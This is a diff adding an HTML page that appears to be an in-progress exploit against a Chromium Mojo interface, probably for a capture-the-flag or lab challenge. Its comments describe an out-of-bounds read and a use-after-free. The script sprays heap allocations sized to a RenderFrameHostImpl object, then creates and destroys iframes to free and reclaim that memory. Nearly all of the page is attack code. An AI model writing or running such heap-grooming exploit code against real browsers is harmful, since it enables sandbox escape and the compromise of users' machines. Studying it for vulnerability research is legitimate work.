@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+
+<!-- 1. we can read arbitraty length from our 'data_store_' (std::vector<uint8_t>) -->
+<!-- 2. uaf due to 'MakeSelfOwnedReciever' - we can still queue messages on the pipe-->
+	<body>
+		<script src="/mojo_js_extracted/mojo/public/js/mojo_bindings.js"></script>
+
+		<script>
+			console.log('asdf');
+		</script>
+
+		<script>
+			const IFRAMES = 10;
+			const SPRAY = 900;
+			const RENDER_FRAME_HOST_IMPL_SIZE = 0xcd0;
+			const DATA = new Uint8Array(RENDER_FRAME_HOST_IMPL_SIZE).fill(0x23).buffer;
+			const heap = [];
+		</script>
+
+		<script>
+			function create_rfh(id) {
+				const iframe = document.createElement('iframe');
+				iframe.src = "/temp.html";
+				iframe.id = id;
+
+				document.body.appendChild(iframe);
+			}
+
+			function delete_rfh(id) {
+				document.getElementById(id).remove();
+			}
+
+			for(let i = 0; i < SPRAY; i++) {
+				heap[i] = new Allocation();
+			}
+		</script>
+
+		<script>
+			for (let i = 0; i < IFRAMES; i++) {
+				for(let j = 0; j < SPRAY / IFRAMES; j++) {
+					if (j == SPRAY / IFRAMES / 2) {
+						heap[(i * 4) + j].malloc(DATA);
+					}
+					console.log(i * 4 + j);
+				}
+
+				create_rfh(`qwerty${i}`);
+				setTimeout(() => delete_rfh(`qwerty${i}`), 1100);
+			}
+
+			setTimeout(() => location.reload(), 5000);
+		</script>
+	</body>
+</html>
